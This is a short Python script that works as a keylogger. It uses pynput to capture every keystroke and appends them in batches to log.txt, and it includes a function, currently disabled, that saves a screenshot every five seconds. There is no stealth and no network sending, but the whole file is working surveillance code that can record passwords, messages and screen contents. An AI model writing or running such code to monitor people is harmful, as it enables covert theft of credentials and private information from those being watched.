import pyautogui
import time
import threading
import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime
count = 0
keys = []
src = True


def key_logger():

    def on_press(key):
        global keys, count

        keys.append(key)
        count += 1

        print(f"{key} pressed")
        if count >= 10:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open('log.txt', "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    # f.close()
                elif k.find("Key") == -1:

                    f.write(k)
                    # f.close()   

    def on_release(key):
        global src
        if key == Key.esc:
            src = False
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def screen_rec():
    while src == True:
        dandt = datetime.now().strftime('%Y_%m_%d %H_%M_%S')
        pyautogui.screenshot(f'img/{dandt}.png')
        time.sleep(5)


if __name__ == "__main__":
    threading.Thread(target=key_logger).start()
    # threading.Thread(target=screen_rec).start()
